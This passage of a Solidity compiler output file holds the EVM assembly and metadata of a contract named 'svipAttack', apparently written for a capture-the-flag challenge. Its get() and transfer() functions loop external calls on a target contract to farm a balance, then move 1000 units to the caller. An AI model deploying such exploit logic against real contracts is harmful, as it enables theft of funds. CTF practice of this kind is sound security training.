									"value": "0"
								},
								{
									"begin": 48,
									"end": 437,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a165627a7a72305820ed92e7a76ceed5a71f5659588d73f4884c3d4df6bd931e4fc3ea7b5c366aeb320029",
									".code": [
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "MSTORE"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "LT"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "JUMPI"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "SWAP1"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "DIV"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "AND"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "DUP1"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH",
											"value": "6D4CE63C"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "EQ"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "JUMPI"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "DUP1"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH",
											"value": "8A4068DD"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "EQ"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "JUMPI"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "JUMPDEST"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "DUP1"
										},
										{
											"begin": 48,
											"end": 437,
											"name": "REVERT"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "JUMP"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "STOP"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "JUMPDEST"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "POP"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "JUMP"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "JUMPDEST"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "STOP"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "JUMPDEST"
										},
										{
											"begin": 190,
											"end": 196,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP1"
										},
										{
											"begin": 190,
											"end": 199,
											"name": "SWAP1"
										},
										{
											"begin": 190,
											"end": 199,
											"name": "POP"
										},
										{
											"begin": 186,
											"end": 249,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 186,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 202,
											"end": 204,
											"name": "PUSH",
											"value": "63"
										},
										{
											"begin": 200,
											"end": 201,
											"name": "DUP2"
										},
										{
											"begin": 200,
											"end": 204,
											"name": "LT"
										},
										{
											"begin": 186,
											"end": 249,
											"name": "ISZERO"
										},
										{
											"begin": 186,
											"end": 249,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 186,
											"end": 249,
											"name": "JUMPI"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "DUP1"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "SWAP1"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "SLOAD"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "SWAP1"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "EXP"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "SWAP1"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "DIV"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 224,
											"end": 226,
											"name": "AND"
										},
										{
											"begin": 224,
											"end": 235,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 224,
											"end": 235,
											"name": "AND"
										},
										{
											"begin": 224,
											"end": 235,
											"name": "PUSH",
											"value": "5BEA9FAA"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "MLOAD"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "DUP2"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "AND"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "MUL"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "DUP2"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "MSTORE"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "ADD"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "MLOAD"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "DUP1"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "DUP4"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "SUB"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "DUP2"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "DUP8"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "DUP1"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "POP"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "GAS"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "CALL"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "POP"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "POP"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "POP"
										},
										{
											"begin": 224,
											"end": 237,
											"name": "POP"
										},
										{
											"begin": 205,
											"end": 208,
											"name": "DUP1"
										},
										{
											"begin": 205,
											"end": 208,
											"name": "DUP1"
										},
										{
											"begin": 205,
											"end": 208,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 205,
											"end": 208,
											"name": "ADD"
										},
										{
											"begin": 205,
											"end": 208,
											"name": "SWAP2"
										},
										{
											"begin": 205,
											"end": 208,
											"name": "POP"
										},
										{
											"begin": 205,
											"end": 208,
											"name": "POP"
										},
										{
											"begin": 186,
											"end": 249,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 186,
											"end": 249,
											"name": "JUMP"
										},
										{
											"begin": 186,
											"end": 249,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 186,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "POP"
										},
										{
											"begin": 155,
											"end": 256,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "JUMPDEST"
										},
										{
											"begin": 302,
											"end": 308,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 309,
											"end": 310,
											"name": "DUP1"
										},
										{
											"begin": 302,
											"end": 310,
											"name": "SWAP1"
										},
										{
											"begin": 302,
											"end": 310,
											"name": "POP"
										},
										{
											"begin": 298,
											"end": 382,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 298,
											"end": 382,
											"name": "JUMPDEST"
										},
										{
											"begin": 313,
											"end": 315,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 311,
											"end": 312,
											"name": "DUP2"
										},
										{
											"begin": 311,
											"end": 315,
											"name": "LT"
										},
										{
											"begin": 298,
											"end": 382,
											"name": "ISZERO"
										},
										{
											"begin": 298,
											"end": 382,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 298,
											"end": 382,
											"name": "JUMPI"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "DUP1"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "SWAP1"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "SLOAD"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "SWAP1"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "EXP"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "SWAP1"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "DIV"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 335,
											"end": 337,
											"name": "AND"
										},
										{
											"begin": 335,
											"end": 352,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 335,
											"end": 352,
											"name": "AND"
										},
										{
											"begin": 335,
											"end": 352,
											"name": "PUSH",
											"value": "326F823F"
										},
										{
											"begin": 361,
											"end": 365,
											"name": "ADDRESS"
										},
										{
											"begin": 367,
											"end": 369,
											"name": "PUSH",
											"value": "62"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "MLOAD"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP4"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "AND"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "MUL"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP2"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "MSTORE"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "ADD"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP1"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP4"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "AND"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "AND"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP2"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "MSTORE"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "ADD"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP3"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP2"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "MSTORE"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "ADD"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "SWAP3"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "POP"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "POP"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "POP"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "MLOAD"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP1"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP4"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "SUB"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP2"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP8"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "DUP1"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "POP"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "GAS"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "CALL"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "POP"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "POP"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "POP"
										},
										{
											"begin": 335,
											"end": 370,
											"name": "POP"
										},
										{
											"begin": 316,
											"end": 319,
											"name": "DUP1"
										},
										{
											"begin": 316,
											"end": 319,
											"name": "DUP1"
										},
										{
											"begin": 316,
											"end": 319,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 316,
											"end": 319,
											"name": "ADD"
										},
										{
											"begin": 316,
											"end": 319,
											"name": "SWAP2"
										},
										{
											"begin": 316,
											"end": 319,
											"name": "POP"
										},
										{
											"begin": 316,
											"end": 319,
											"name": "POP"
										},
										{
											"begin": 298,
											"end": 382,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 298,
											"end": 382,
											"name": "JUMP"
										},
										{
											"begin": 298,
											"end": 382,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 298,
											"end": 382,
											"name": "JUMPDEST"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "DUP1"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "SWAP1"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "SLOAD"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "SWAP1"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "EXP"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "SWAP1"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "DIV"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 392,
											"end": 394,
											"name": "AND"
										},
										{
											"begin": 392,
											"end": 409,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 392,
											"end": 409,
											"name": "AND"
										},
										{
											"begin": 392,
											"end": 409,
											"name": "PUSH",
											"value": "326F823F"
										},
										{
											"begin": 410,
											"end": 420,
											"name": "CALLER"
										},
										{
											"begin": 421,
											"end": 425,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "MLOAD"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP4"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "AND"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "MUL"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP2"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "MSTORE"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "ADD"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP1"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP4"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "AND"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "AND"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP2"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "MSTORE"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "ADD"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP3"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP2"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "MSTORE"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "ADD"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "SWAP3"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "POP"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "POP"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "POP"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "MLOAD"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP1"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP4"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "SUB"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP2"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP8"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "DUP1"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "POP"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "GAS"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "CALL"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "POP"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "POP"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "POP"
										},
										{
											"begin": 392,
											"end": 426,
											"name": "POP"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "POP"
										},
										{
											"begin": 262,
											"end": 434,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"get()": "6d4ce63c",
							"transfer()": "8a4068dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.4.26+commit.4563c3fc\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[],\"name\":\"get\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"transfer\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_addr\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u4e8c\\u9898/SvipAttack.sol\":\"svipAttack\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u4e8c\\u9898/SVip.sol\":{\"keccak256\":\"0x4139b96a54747737279279df36d81f25a6f233aa841e18148e5d1d4b8f4da435\",\"urls\":[\"bzzr://8f5088e054d58465f2f4a6ddefd1e1f924ddcfd3e59ef113412f0b6c2ff88e08\"]},\"\\u8d5b\\u9898-\\u9884\\u8d5b/\\u7b2c\\u4e8c\\u9898/SvipAttack.sol\":{\"keccak256\":\"0x0574225c353c0b1e6541d39b3260e335d4f75ba960c6d7d279e60c2e9d79488d\",\"urls\":[\"bzzr://f055e2c8e8a9fd906106291d5867a99c6451f8c8ff25cc2e9de80145c19a24ea\"]}},\"version\":1}",
					"userdoc": {
						"methods": {}
